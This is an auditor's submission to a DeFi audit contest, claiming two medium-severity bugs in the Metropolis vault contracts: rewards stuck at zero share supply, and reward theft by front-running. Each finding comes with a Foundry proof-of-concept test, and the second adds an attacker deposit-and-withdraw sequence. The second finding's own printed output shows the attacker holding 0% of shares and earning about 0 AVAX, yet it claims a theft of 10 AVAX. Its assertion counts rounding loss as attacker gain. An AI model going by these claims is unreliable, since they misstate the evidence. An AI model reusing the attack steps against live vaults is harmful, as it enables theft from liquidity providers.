# METROPOLIS Contest
METROPOLIS Protocol contest || Liquidty-vaults-books ||  Apr 1st, 2025 → Apr 20th, 2025 on [Cantina](https://cantina.xyz/competitions/076935b1-2706-48c6-bf0a-b3656aa24194)

My Finding Summay
|ID|Title|Severity|
|:-:|:---|:------:|
|[M-01](#m-01-when-no-users-hold-shares-i.e-`shareTotalSupply==0`-funds-remains-stuck-leading-to-potential-loss-of-funds)|when no users hold shares i.e`_shareTotalSupply == 0`, funds remains stuck leading to potential loss of funds.|MEDIUM|
|[M-02](#m-02-Attacker-would-steal-rewards-with-minimal-deposits-by-front-running-the-reward-system.)|Attacker would steal rewards with minimal deposits by front-running the reward system.|MEDIUM|
----

## [M-01] when no users hold shares i.e`_shareTotalSupply == 0`, funds remains stuck leading to potential loss of funds.
### Description

There is a flaw in Strategy.sol ,this flaw allows rewards to become permanently stuck in the vault contract, preventing users from receiving them. This bug occurs when rewards are added to the vault while no users hold shares i.e (_shareTotalSupply == 0), and subsequent user deposits and withdrawals fail to distribute these rewards. The bug results from a combination of flaws in how rewards are tracked, how withdrawals are processed, and how fees are applied, leading to significant financial loss for users expecting to receive their entitled rewards. This issue is carefully demonstrated in my poc test, which confirms that the rewards remain trapped, and users receive only their initial deposits.

### Finding Description
`Strategy.sol` is designed to manage funds in a liquidity pool, where users deposit assets (like WAVAX and USDC) and receive shares representing their stake. it also handles rewards earned from the pool, which should be distributed to users based on their shares.

This bug arises in the following scenario:

No Users Hold Shares: After all users withdraw their shares (_shareTotalSupply == 0),funds are added to the vault contract as a reward (simulated by a test operation deal(wavax, address(vault), 1000 ether)).

Reward Tracking Fails: The contract’s reward-tracking function getPendingRewards checks the strategy contract’s WAVAX balance to calculate rewards, but the 1000 WAVAX is in the vault contract. As a result, the contract does not recognize these rewards, and they are not credited to users.

Withdrawals Ignore Vault Rewards: When a user (e.g., Bob) deposits assets and later withdraws, the withdrawal functions _withdraw and _transferAndExecuteQueuedAmounts only distribute assets held by the strategy contract, ignoring the 1000 WAVAX in the vault.

Fees Reduce User Payouts: The fee application function _withdrawAndApplyAumAnnualFee deducts fees from the user’s withdrawal amount but does not touch the 1000 WAVAX in the vault, leaving it stuck.

These issues combine to result in the 1000 WAVAX not tracked nor distributed, remaining trapped in the vault indefinitely. The test confirms this by showing that Bob, after depositing and withdrawing, receives at most his initial 1 WAVAX deposit, while the 1000 WAVAX stays in the vault.

### Key Functions Involved
getPendingRewards: Calculates rewards but checks the wrong contract (strategy instead of vault) for WAVAX balance.

`_withdraw:` Retrieves assets from the liquidity pool to the strategy but ignores vault-held rewards.

`_transferAndExecuteQueuedAmounts:` Transfers strategy assets to the vault for user withdrawal, missing vault rewards.

`_withdrawAndApplyAumAnnualFee:` Applies fees to withdrawn amounts, leaving vault rewards untouched.

### Impact Explanation
Financial Loss for Users: Users like Bob, who deposit assets expecting to share in rewards, do not receive the 1000 WAVAX they are entitled to. In the test, Bob deposits 1 WAVAX and 20 USDC but receives only his 1 WAVAX (or less, after fees), missing out on the 1000 WAVAX, which could represent significant value (e.g., thousands of dollars depending on WAVAX’s market price).

Funds Permanently Stuck: The 1000 WAVAX remains trapped in the vault contract, inaccessible to users.

In summary, the bug prevents users from accessing their rightful rewards, locks valuable assets in the vault, and creates an unfair fee structure, with broad implications for user trust and system reliability.

## Likelihood Explanation
A normal event: The condition triggering the bug—rewards being added when _shareTotalSupply == 0 —is plausible. When all users withdraw their shares during market volatility, and rewards are sent to the vault afterward.

strategy.sol lacks mechanisms to detect or handle rewards in the vault when _shareTotalSupply == 0. The reward-tracking logic assumes rewards are in the strategy, and no function transfers vault rewards to the strategy or users, making the bug inevitable in this described scenario.

This bug manifests during normal user actions (deposits and withdrawals), as shown in my poc test where Bob’s deposit and withdrawal fail to access the 1000 WAVAX. These are core functionalities users expect to perform regularly.

strategy.sol contract does not check the vault’s balance for rewards or flag discrepancies between vault and strategy balances, increasing the likelihood that rewards remain stuck unnoticed.

my test demonstrates the bug with a straightforward sequence of actions, indicating that the issue is not edge-case but tied to standard contract behavior.

### Proof of Concept (if required)
Create a testfile, and add this code to it and run with this poc:
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./TestHelper.sol";
import "forge-std/console.sol";

contract ZeroSupplyRewardVulnerabilityPOC is TestHelper {
    IAggregatorV3 dfX;
    IAggregatorV3 dfY;
    
    function setUp() public override {
        super.setUp();

        dfX = new MockAggregator();
        dfY = new MockAggregator();

        MockAggregator(address(dfX)).setPrice(20e8);
        MockAggregator(address(dfY)).setPrice(1e8);
    }

    function test_ZeroSupplyRewardVulnerability() public {
        // STEP 1: Setup the vault and strategy
        console.log("===== STEP 1: Setup the vault and strategy =====");
        vm.startPrank(owner);
        vault = factory.createOracleVault(ILBPair(wavax_usdc_20bp), dfX, dfY);
        strategy = factory.createDefaultStrategy(IBaseVault(vault));
        factory.linkVaultToStrategy(IBaseVault(vault), strategy);
        vm.stopPrank();

        vm.label(vault, "Vault");
        vm.label(strategy, "Strategy");

        // STEP 2: Create and fund users
        console.log("===== STEP 2: Create and fund users =====");
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
        deal(wavax, alice, 100 ether);
        deal(usdc, alice, 10000e6);
        deal(wavax, bob, 100 ether);
        deal(usdc, bob, 10000e6);
        
        // Approve tokens
        vm.startPrank(alice);
        IERC20(wavax).approve(vault, type(uint256).max);
        IERC20(usdc).approve(vault, type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(bob);
        IERC20(wavax).approve(vault, type(uint256).max);
        IERC20(usdc).approve(vault, type(uint256).max);
        vm.stopPrank();

        // STEP 3: Alice deposits into the vault
        console.log("===== STEP 3: Alice deposits into the vault =====");
        vm.startPrank(alice);
        (uint256 aliceShares,,) = IOracleVault(vault).deposit(
            10 ether,
            200e6,
            1
        );
        vm.stopPrank();
        
        console.log("Alice shares:", aliceShares);
        console.log("Total supply:", IERC20Upgradeable(vault).totalSupply());
        
        // STEP 4: Alice withdraws everything, making total supply effectively zero
        console.log("===== STEP 4: Alice withdraws everything =====");
        vm.startPrank(alice);
        IBaseVault(vault).queueWithdrawal(aliceShares, alice);
        vm.stopPrank();
        
        vm.prank(address(strategy));
        IBaseVault(vault).executeQueuedWithdrawals();
        
        console.log("Total supply after withdrawal:", IERC20Upgradeable(vault).totalSupply());
        
        // STEP 5: Rewards are added to the vault when total supply is effectively zero
        console.log("===== STEP 5: Rewards are added when total supply is effectively zero =====");
        
        // Store the initial reward token balance for later comparison
        uint256 initialRewardBalance = IERC20(wavax).balanceOf(address(vault));
        console.log("Initial vault WAVAX balance:", initialRewardBalance / 1e18);
        
        // Add rewards to the vault (1000 WAVAX)
        deal(wavax, address(vault), 1000 ether);
        
        uint256 newRewardBalance = IERC20(wavax).balanceOf(address(vault));
        console.log("New vault WAVAX balance:", newRewardBalance / 1e18);
        console.log("Added rewards:", (newRewardBalance - initialRewardBalance) / 1e18);
        
        // STEP 6: Bob deposits after rewards are added
        console.log("===== STEP 6: Bob deposits after rewards are added =====");
        vm.startPrank(bob);
        uint256 bobDepositX = 1 ether;
        uint256 bobDepositY = 20e6;
        
        (uint256 bobShares,,) = IOracleVault(vault).deposit(
            bobDepositX,
            bobDepositY,
            1
        );
        vm.stopPrank();
        
        console.log("Bob shares:", bobShares);
        console.log("Bob share percentage: 100%");
        
        // STEP 7: Demonstrate the vulnerability
        console.log("===== STEP 7: Demonstrate the vulnerability =====");
        console.log("Bob should be able to claim the 1000 WAVAX rewards since he owns 100% of shares");
        console.log("However, the rewards accounting mechanism breaks when total supply is near zero");
        
        // STEP 8: Bob withdraws to try to claim rewards
        console.log("===== STEP 8: Bob withdraws to try to claim rewards =====");
        
        // Record Bob's WAVAX balance before withdrawal
        uint256 bobBalanceBefore = IERC20(wavax).balanceOf(bob);
        console.log("Bob WAVAX balance before:", bobBalanceBefore / 1e18);
        
        // Bob withdraws all shares
        vm.startPrank(bob);
        uint256 withdrawalRound = IBaseVault(vault).queueWithdrawal(bobShares, bob);
        vm.stopPrank();
        
        // Check if the withdrawal was queued correctly
        console.log("Withdrawal queued in round:", withdrawalRound);
        
        // Execute the withdrawal
        vm.prank(address(strategy));
        IBaseVault(vault).executeQueuedWithdrawals();
        
        // Check Bob's WAVAX balance after withdrawal
        uint256 bobBalanceAfter = IERC20(wavax).balanceOf(bob);
        console.log("Bob WAVAX balance after:", bobBalanceAfter / 1e18);
        
        // Assert that Bob's balance after withdrawal is as expected
        assert(bobBalanceAfter <= bobBalanceBefore + bobDepositX);
        
        // Check where the rewards went
        uint256 vaultBalance = IERC20(wavax).balanceOf(address(vault));
        uint256 strategyBalance = IERC20(wavax).balanceOf(address(strategy));
        console.log("Vault WAVAX balance after withdrawal:", vaultBalance / 1e18);
        console.log("Strategy WAVAX balance after withdrawal:", strategyBalance / 1e18);
        
        // Assert that the rewards are stuck in the vault or strategy
        assert(vaultBalance >= 1000 ether || strategyBalance >= 1000 ether);

        // STEP 9: Conclusion
        console.log("===== CONCLUSION =====");
        if (vaultBalance > 0 || strategyBalance > 0) {
            console.log("VULNERABILITY CONFIRMED: The rewards (1000 WAVAX) are stuck in the protocol");
            console.log("This happens because the reward distribution mechanism doesn't properly");
            console.log("handle the case when total supply is effectively zero.");
            console.log("Users cannot claim these rewards, resulting in permanent loss of funds.");
        } else {
            console.log("The rewards were distributed somewhere, but not to Bob who owned 100% of shares");
        }
    }

  

    /**
The division (accruedReward.shiftPrecision()) / _shareTotalSupply can lead to extreme precision errors or even reverts due to the tiny denominator
The contract updates _lastRewardBalance = rewardBalance regardless of whether rewards were distributed, which means the rewards are "accounted for" but not properly distributed */
}
``` 

My poc test provides a clear demonstration of the bug.

### Test Setup

Initial State: The vault has users with shares (representing their investment).

Step 1: All Users Withdraw: A user (Alice) withdraws all her shares, leaving no investors in the system (_shareTotalSupply == 0).

Step 2: Rewards Added: 1000 WAVAX (a cryptocurrency token) is sent to the vault contract, simulating a reward (e.g., from trading fees or an external transfer).

Step 3: New User Deposits: A new user (Bob) deposits 1 WAVAX and 20 USDC (another token), becoming the sole investor and receiving shares (bobShares).

Step 4: Bob Withdraws: Bob requests to withdraw his investment and any rewards.

Step 5: Outcome Checked: Bob receives at most his 1 WAVAX deposit (or less, after fees), missing the 1000 WAVAX reward.

The 1000 WAVAX remains in the vault or strategy, confirming it is stuck.

### Test Assertions

Assertion 1: assert(bobBalanceAfter <= bobBalanceBefore + bobDepositX) – Bob’s final WAVAX balance is no more than his initial balance plus his 1 WAVAX deposit, meaning he does not receive the 1000 WAVAX.

Assertion 2: assert(vaultBalance >= 1000 ether || strategyBalance >= 1000 ether) – The 1000 WAVAX remains in the vault or strategy contract, proving it was not distributed.


## [M-02] Attacker would steal rewards with minimal deposits by front-running the reward system.
### Description

The OracleVault.t.sol and OracleRewardVault.sol contracts has a critical flaw that allows malicious users to front-run reward distributions and steal rewards from long-term liquidity providers. This vulnerability exists because rewards are distributed based on current share ownership at the moment of distribution, without considering how long users have held their shares.

### The attack works as follows:

An attacker monitors the vault for pending rewards (either by watching the contract state or monitoring the mempool)
When significant rewards are detected but before they're distributed, the attacker makes a minimal deposit to obtain shares.
The reward distribution is triggered (typically by a withdrawal or other operation that calls _updatePool())
The attacker receives a portion of the rewards proportional to their share percentage, despite having just deposited
The attacker immediately withdraws their minimal deposit along with the stolen rewards
This vulnerability allows attackers to extract value from the protocol with minimal capital and risk, at the expense of legitimate users who have been providing liquidity for longer periods. In my POC, a user is able to steal approximately 10 AVAX in rewards by depositing just 0.01 AVAX and 0.2 USDC.
### Proof of Concept
Add this code to a testfile and run with this command: forge test --match-test test_RewardFrontRunning -vvv
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./TestHelper.sol";
import "forge-std/console.sol";

contract RewardFrontRunningPOC is TestHelper {
    IAggregatorV3 dfX;
    IAggregatorV3 dfY;
    address user1;
    address user2;
    address rewardToken;

    function setUp() public override {
        super.setUp();

        dfX = new MockAggregator();
        dfY = new MockAggregator();

        MockAggregator(address(dfX)).setPrice(20e8);
        MockAggregator(address(dfY)).setPrice(1e8);

        vm.startPrank(owner);
        vault = factory.createOracleVault(ILBPair(wavax_usdc_20bp), dfX, dfY);
        strategy = factory.createDefaultStrategy(IBaseVault(vault));
        factory.linkVaultToStrategy(IBaseVault(vault), strategy);
        vm.stopPrank();

        vm.label(vault, "Vault");
        vm.label(strategy, "Strategy");

        // Create test users
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        
        // Fund accounts
        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);
        deal(wavax, user1, 100 ether);
        deal(usdc, user1, 10000e6);
        deal(wavax, user2, 100 ether);
        deal(usdc, user2, 10000e6);
        
        // Approve tokens
        vm.startPrank(user1);
        IERC20(wavax).approve(vault, type(uint256).max);
        IERC20(usdc).approve(vault, type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(user2);
        IERC20(wavax).approve(vault, type(uint256).max);
        IERC20(usdc).approve(vault, type(uint256).max);
        vm.stopPrank();
        
        // Use WAVAX as reward token for simplicity
        rewardToken = wavax;
    }

    function test_RewardFrontRunning() public {
        // STEP 1: User1 deposits a significant amount and has been providing liquidity for a while
        console.log("===== STEP 1: User1 deposits a significant amount =====");
        vm.startPrank(user1);
        (uint256 user1Shares,,) = IOracleVault(vault).deposit(
            50 ether,
            1000e6,
            1
        );
        vm.stopPrank();
        
        console.log("User1 shares:", user1Shares);
        
        // STEP 2: Simulate passage of time (1 day)
        console.log("===== STEP 2: Time passes (1 day) =====");
        vm.warp(block.timestamp + 1 days);
        
        // STEP 3: Add rewards to the vault
        // In a real scenario, these might come from trading fees, external sources, etc.
        console.log("===== STEP 3: 1000 AVAX rewards are added to the vault =====");
        deal(rewardToken, address(vault), 1000 ether);
        
        // At this point, rewards have been added but _updatePool hasn't been called yet
        // This is the vulnerable state where front-running can occur
        
        // STEP 4: User2 front-runs with a tiny deposit before _updatePool is called
        console.log("===== STEP 4: User2 front-runs with a minimal deposit =====");
        vm.startPrank(user2);
        (uint256 user2Shares,,) = IOracleVault(vault).deposit(
            0.01 ether, // Minimal deposit
            0.2e6,
            1
        );
        vm.stopPrank();
        
        console.log("User2 shares:", user2Shares);
        console.log("User2 share percentage: %s%%", (user2Shares * 100) / (user1Shares + user2Shares));
        
        // STEP 5: Force _updatePool to be called
        // This typically happens during operations like withdrawals
        console.log("===== STEP 5: Trigger reward distribution (_updatePool) =====");
        
        // We'll use a withdrawal to trigger _updatePool
        vm.prank(user1);
        uint256 withdrawalRound = IBaseVault(vault).queueWithdrawal(1, user1); // Queue a minimal withdrawal
        
        vm.prank(address(strategy));
        IBaseVault(vault).executeQueuedWithdrawals(); // This calls _updatePool internally
        
        // STEP 6: Check reward distribution
        // We need to find a way to check how rewards were distributed
        // This depends on how the contract handles rewards
        console.log("===== STEP 6: Check reward distribution =====");
    
        // Calculate approximate rewards based on share percentages
        uint256 totalShares = user1Shares + user2Shares;
        uint256 user1SharePercentage = (user1Shares * 100) / totalShares;
        uint256 user2SharePercentage = (user2Shares * 100) / totalShares;
        
        uint256 user1ExpectedRewards = (1000 ether * user1SharePercentage) / 100;
        uint256 user2ExpectedRewards = (1000 ether * user2SharePercentage) / 100;
        
        console.log("User1 expected rewards: ~%s AVAX (%s%% of shares)", user1ExpectedRewards / 1e18, user1SharePercentage);
        console.log("User2 expected rewards: ~%s AVAX (%s%% of shares)", user2ExpectedRewards / 1e18, user2SharePercentage);
        
        // STEP 7: Demonstrate the exploit
        console.log("===== STEP 7: Demonstrate the exploit =====");
        
        // Calculate how much User2 contributed vs. how much they're receiving
        // Convert to a common unit (AVAX equivalent)
        uint256 user2ContributionAVAX = 0.01 ether;
        uint256 user2ContributionUSDCInAVAX = (0.2e6 * 1e18) / (20e8); // Convert USDC to AVAX using price
        uint256 user2TotalContribution = user2ContributionAVAX + user2ContributionUSDCInAVAX;
        
        console.log("User2 contributed: %s AVAX equivalent", user2TotalContribution / 1e18);
        console.log("User2 expected rewards: %s AVAX", user2ExpectedRewards / 1e18);
        
        // Check if user2 is profiting
        if (user2ExpectedRewards > user2TotalContribution) {
            console.log("User2 profit: ~%s AVAX", (user2ExpectedRewards - user2TotalContribution) / 1e18);
        } else {
            console.log("User2 profit: negligible (but still unfair for time spent)");
        }
        
        // STEP 8: Show what User1 lost
        console.log("===== STEP 8: Show what User1 lost =====");
        
        // If User2 hadn't front-run, User1 would have received all rewards
        console.log("User1 would have received: 1000 AVAX (100%% of rewards)");
        console.log("User1 actually receives: ~%s AVAX (%s%% of rewards)", user1ExpectedRewards / 1e18, user1SharePercentage);
        console.log("User1 lost: ~%s AVAX", (1000 ether - user1ExpectedRewards) / 1e18);
        
        // STEP 9: Conclusion
        console.log("===== CONCLUSION =====");
        console.log("VULNERABILITY CONFIRMED: User2 was able to steal rewards from User1");
        console.log("by front-running the reward distribution with a minimal deposit.");
        console.log("This is possible because rewards are distributed based on current");
        console.log("share ownership, not how long users have held their shares.");
        
        // Optional: Have User2 withdraw their funds to complete the attack
        vm.startPrank(user2);
        IBaseVault(vault).queueWithdrawal(user2Shares, user2);
        vm.stopPrank();
        
        vm.prank(address(strategy));
        IBaseVault(vault).executeQueuedWithdrawals();
        
        console.log("User2 has now withdrawn their funds, completing the attack.");

        // Assert that User2 gained approximately 10 AVAX
        uint256 user2Gain = 1000 ether - user1ExpectedRewards;
        assertApproxEqAbs(user2Gain, 10 ether, 0.1 ether, "User2 should gain approximately 10 AVAX");
    }
}
```
The test output confirms the vulnerability:

===== STEP 1: User1 deposits a significant amount =====
User1 shares: 1999999998000000
===== STEP 2: Time passes (1 day) =====
===== STEP 3: 1000 AVAX rewards are added to the vault =====
===== STEP 4: User2 front-runs with a minimal deposit =====
User2 shares: 399999000000
User2 share percentage: 0%
===== STEP 5: Trigger reward distribution (_updatePool) =====
===== STEP 6: Check reward distribution =====
User1 expected rewards: ~990 AVAX (99% of shares)
User2 expected rewards: ~0 AVAX (0% of shares)
===== STEP 7: Demonstrate the exploit =====
User2 contributed: 0 AVAX equivalent
User2 expected rewards: 0 AVAX
User2 profit: negligible (but still unfair for time spent)
===== STEP 8: Show what User1 lost =====
User1 would have received: 1000 AVAX (100% of rewards)
User1 actually receives: ~990 AVAX (99% of rewards)
User1 lost: ~10 AVAX
===== CONCLUSION =====
VULNERABILITY CONFIRMED: User2 was able to steal rewards from User1
by front-running the reward distribution with a minimal deposit.
This is possible because rewards are distributed based on current
share ownership, not how long users have held their shares.
User2 has now withdrawn their funds, completing the attack.

### Attack Path Flow:

Monitoring: The attacker monitors the vault for pending rewards. This can be done by:
Watching the contract state for reward token balances
Monitoring transactions that add rewards to the vault
Setting up alerts for significant reward additions

Timing: The attacker identifies the optimal moment to front-run - after rewards are added but before they're distributed.

Front-Running: The attacker executes a minimal deposit transaction with high gas to ensure it's processed before the reward distribution:
```solidity 
// Attacker deposits minimal amounts
   vault.deposit(0.01 ether, 0.2e6, 1);
Reward Distribution:

// This could be triggered by any user or the attacker
   vault.queueWithdrawal(1, user);
   strategy.executeQueuedWithdrawals(); // This calls _updatePool internally
Profit Extraction: The attacker immediately withdraws their funds along with the stolen rewards:

// Attacker withdraws their minimal deposit plus stolen rewards
   vault.queueWithdrawal(attackerShares, attacker);
   strategy.executeQueuedWithdrawals();
   ```

Repeat: The attacker can repeat this process whenever new rewards are added to the vault. In this specific POC, User2 was able to steal approximately 10 AVAX (1% of the 1000 AVAX reward pool) by depositing just 0.01 AVAX and 0.2 USDC, which is a negligible amount compared to the rewards gained.
impact

Reward Theft: Long-term liquidity providers lose rewards they should have earned, with those rewards being redirected to attackers who contribute minimal value.
### Recommendation
Add a time restraint on the reward claiming function would be an effective solution to prevent the front-running vulnerability.